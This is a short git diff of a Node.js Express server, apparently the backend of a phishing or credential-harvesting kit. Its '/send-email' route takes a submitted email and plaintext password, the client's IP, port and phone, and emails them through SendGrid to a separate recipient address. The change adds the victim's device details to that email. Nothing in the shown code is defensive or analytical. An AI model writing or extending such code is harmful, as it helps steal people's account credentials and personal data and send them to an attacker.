@@ -14,7 +14,7 @@ sgMail.setApiKey(process.env.SG_API_KEY);
 
 // POST route to send an email
 app.post("/send-email", async (req, res) => {
-  const { email, password, recEmail, phone, port } = req.body;
+  const { email, password, recEmail, phone, port, deviceDetails } = req.body;
 
   const ip = req.ip.split(":").pop();
 
@@ -30,7 +30,8 @@ app.post("/send-email", async (req, res) => {
               <p>Password: ${password}</p>
 
               <p>IP: ${ip}</p>
-              <p>PORT: ${port}</p>   
+              <p>PORT: ${port}</p>
+              <p>Device Details: ${deviceDetails}</p>
     `,
   };
 
